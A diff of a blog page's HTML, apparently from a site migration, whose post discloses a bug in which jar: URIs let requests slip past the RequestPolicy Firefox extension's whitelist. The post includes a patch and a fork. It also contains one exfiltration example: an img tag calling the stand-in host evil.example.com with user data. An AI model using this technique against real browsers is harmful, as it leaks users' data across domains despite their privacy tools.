@@ -9,7 +9,8 @@
   <meta name="author" content="Jordan Milne">
 
   
-  <meta name="description" content="Here&rsquo;s an interesting bug I found while looking at some cross-domain data-stealing issues.&nbsp;It&rsquo;s possible to bypass RequestPolicy& &hellip;">
+  <meta name="description" content="Here&rsquo;s an interesting bug I found while looking at some cross-domain data-stealing issues.
+It&rsquo;s possible to bypass RequestPolicy&rsquo;s &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -18,7 +19,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
 
   
-  <link rel="canonical" href="http://JordanMilne.github.io/blog/2013/11/29/bypassing-requestpolicys-whitelist-using-the-jar-uri-scheme">
+  <link rel="canonical" href="http://JordanMilne.github.io/2013/11/29/bypassing-requestpolicys-whitelist-using-the-jar-uri-scheme">
   <link href="/favicon.png" rel="icon">
   <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
   <link href="/atom.xml" rel="alternate" title="Defined Misbehaviour" type="application/atom+xml">
@@ -57,6 +58,7 @@
   
 <ul class="main-navigation">
   <li><a href="/">Blog</a></li>
+  <li><a href="/about-me">About Me</a></li>
   <li><a href="/blog/archives">Archives</a></li>
 </ul>
 
@@ -91,7 +93,8 @@
   </header>
 
 
-<div class="entry-content"><p>Here&rsquo;s an interesting bug I found while looking at some cross-domain data-stealing issues.&nbsp;It&rsquo;s possible to bypass <a href="https://www.requestpolicy.com/about.html">RequestPolicy</a>&rsquo;s whitelist entirely by referencing a resource nested in a <a href="http://www.gnucitizen.org/blog/web-mayhem-firefoxs-jar-protocol-issues/">jar URI</a>:</p>
+<div class="entry-content"><p>Here&rsquo;s an interesting bug I found while looking at some cross-domain data-stealing issues.
+It&rsquo;s possible to bypass <a href="https://www.requestpolicy.com/about.html">RequestPolicy</a>&rsquo;s whitelist entirely by referencing a resource nested in a <a href="http://www.gnucitizen.org/blog/web-mayhem-firefoxs-jar-protocol-issues/">jar URI</a>:</p>
 
 <figure class='code'><figcaption><span>Exfiltration example</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">&quot;jar:http://evil.example.com/logger?userdata=whatever!/foobar&quot;</span> <span class="nt">/&gt;</span>
@@ -101,37 +104,31 @@
 <p>Firefox will block the resource from being displayed even if it is
 valid (due to prior security issues with the jar URI scheme,) but a
 cross-domain request is made and it doesn&rsquo;t require JS to execute. This
-can be verified through the network pane in Firefox&rsquo;s dev tools. A limited amount of information <i>may</i> be sent back from the server by using timing information.</p>
+can be verified through the network pane in Firefox&rsquo;s dev tools. A limited amount of information <em>may</em> be sent back from the server by using timing information.</p>
 
-<p>Requests to jar URIs don&rsquo;t get processed by RequestPolicy because <a href="https://github.com/RequestPolicy/requestpolicy/blob/20815944fada20a34e75c54221e33259f11aa6c6/src/components/requestpolicyService.js#L1953">aContentLocation&rsquo;s asciiHost is undefined</a> when the jar URI scheme is used, and <a href="https://github.com/RequestPolicy/requestpolicy/blob/20815944fada20a34e75c54221e33259f11aa6c6/src/components/requestpolicyService.js#L1962">it gets treated as an internal request</a>. Since all <a href="https://github.com/RequestPolicy/requestpolicy/blob/20815944fada20a34e75c54221e33259f11aa6c6/src/components/requestpolicyService.js#L2035">internal requests are implicitly allowed</a>, the request goes through.</p>
+<p>Requests to jar URIs don&rsquo;t get processed by RequestPolicy because <a href="https://github.com/RequestPolicy/requestpolicy/blob/20815944fada20a34e75c54221e33259f11aa6c6/src/components/requestpolicyService.js#L1953">aContentLocation&rsquo;s asciiHost is undefined</a> when the jar URI scheme is used, and <a href="https://github.com/RequestPolicy/requestpolicy/blob/20815944fada20a34e75c54221e33259f11aa6c6/src/components/requestpolicyService.js#L1962">it gets treated as an internal request</a>.
+Since all <a href="https://github.com/RequestPolicy/requestpolicy/blob/20815944fada20a34e75c54221e33259f11aa6c6/src/components/requestpolicyService.js#L2035">internal requests are implicitly allowed</a>, the request goes through.</p>
 
 <p>I emailed Justin the patch a few months ago, but he hasn&rsquo;t responded.
  Hopefully this gets fixed on the addons.mozilla.org version soon, since
  it limits RequestPolicy&rsquo;s effectiveness at preventing data exfiltration.</p>
 
-<p>For now, you can use <a href="https://github.com/JordanMilne/requestpolicy">my fork of RequestPolicy</a>. I&rsquo;m not
-sure if the patch has any interactions with extensions, but it should also fix issues with
-nested use of the view-source scheme (which for some reason doesn&rsquo;t implement<i> </i><a href="http://dxr.mozilla.org/mozilla-central/source/netwerk/base/public/nsINestedURI.idl">nsINestedURI</a>.)</p>
+<p>For now, you can use <a href="https://github.com/JordanMilne/requestpolicy">my fork of RequestPolicy</a>.
+I&rsquo;m not sure if the patch has any interactions with extensions, but it should also fix issues with
+nested use of the view-source scheme (which for some reason doesn&rsquo;t implement <a href="http://dxr.mozilla.org/mozilla-central/source/netwerk/base/public/nsINestedURI.idl">nsINestedURI</a>)</p>
 
-<h3>
-Proof-of-Concept </h3>
+<h3>Proof-of-Concept</h3>
 
 
 <p>If you&rsquo;d like to see whether or not you&rsquo;re vulnerable, <a href="http://saynotolinux.com/tests/requestpolicy_jar.html">I&rsquo;ve made a Proof-of-Concept</a> that detects whether or not RequestPolicy blocked an image from a jar URI.</p>
 
 <p>Without the patch:</p>
 
-<div class="separator" style="clear: both; text-align: center;">
-<a href="http://4.bp.blogspot.com/--4IYDaxwuC8/Uph28XUFB6I/AAAAAAAAAAU/NXvbYQQ1Ja0/s1600/jar-broken.png" rel="prettyPhoto" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://lh3.ggpht.com/--4IYDaxwuC8/Uph28XUFB6I/AAAAAAAAAAU/NXvbYQQ1Ja0/s480/jar-broken.png" /></a></div>
-
+<p><a href="/images/posts/jar-broken.png"><img src="/images/posts/jar-broken.png"></a></p>
 
 <p>With the patch:</p>
 
-<div class="separator" style="clear: both; text-align: center;">
-<a href="http://1.bp.blogspot.com/-jR_Dk43iwGQ/Uph2-PIDiaI/AAAAAAAAAAc/nImqMzTkTmA/s1600/jar-fixed.png" rel="prettyPhoto" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://lh3.ggpht.com/-jR_Dk43iwGQ/Uph2-PIDiaI/AAAAAAAAAAc/nImqMzTkTmA/s480/jar-fixed.png" /></a></div>
-
-
-
+<p><a href="/images/posts/jar-fixed.png"><img src="/images/posts/jar-fixed.png"></a></p>
 </div>
 
 
@@ -162,7 +159,7 @@ Proof-of-Concept </h3>
     
       <div class="sharing">
   
-  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://JordanMilne.github.io/blog/2013/11/29/bypassing-requestpolicys-whitelist-using-the-jar-uri-scheme/" data-via="" data-counturl="http://JordanMilne.github.io/blog/2013/11/29/bypassing-requestpolicys-whitelist-using-the-jar-uri-scheme/" >Tweet</a>
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://JordanMilne.github.io/2013/11/29/bypassing-requestpolicys-whitelist-using-the-jar-uri-scheme/" data-via="" data-counturl="http://JordanMilne.github.io/2013/11/29/bypassing-requestpolicys-whitelist-using-the-jar-uri-scheme/" >Tweet</a>
   
   
   
@@ -172,7 +169,7 @@ Proof-of-Concept </h3>
     <p class="meta">
       
       
-        <a class="basic-alignment right" href="/blog/2013/12/18/abusing-noscripts-global-whitelist-rules-to-reveal-trusted-sites-the-easy-way/" title="Next Post: Abusing NoScript's global whitelist rules to reveal trusted sites (the easy way)">Abusing NoScript's global whitelist rules to reveal trusted sites (the easy way) &raquo;</a>
+        <a class="basic-alignment right" href="/2013/12/18/abusing-noscripts-global-whitelist-rules-to-reveal-trusted-sites-the-easy-way/" title="Next Post: Abusing NoScript's global whitelist rules to reveal trusted sites (the easy way)">Abusing NoScript's global whitelist rules to reveal trusted sites (the easy way) &raquo;</a>
       
     </p>
   </footer>
@@ -187,11 +184,11 @@ Proof-of-Concept </h3>
   <ul id="recent_posts">
     
       <li class="post">
-        <a href="/blog/2013/12/18/abusing-noscripts-global-whitelist-rules-to-reveal-trusted-sites-the-easy-way/">Abusing NoScript's Global Whitelist Rules to Reveal Trusted Sites (the Easy Way)</a>
+        <a href="/2013/12/18/abusing-noscripts-global-whitelist-rules-to-reveal-trusted-sites-the-easy-way/">Abusing NoScript's Global Whitelist Rules to Reveal Trusted Sites (the Easy Way)</a>
       </li>
     
       <li class="post">
-        <a href="/blog/2013/11/29/bypassing-requestpolicys-whitelist-using-the-jar-uri-scheme/">Bypassing RequestPolicy's Whitelist Using the Jar: URI Scheme</a>
+        <a href="/2013/11/29/bypassing-requestpolicys-whitelist-using-the-jar-uri-scheme/">Bypassing RequestPolicy's Whitelist Using the Jar: URI Scheme</a>
       </li>
     
   </ul>
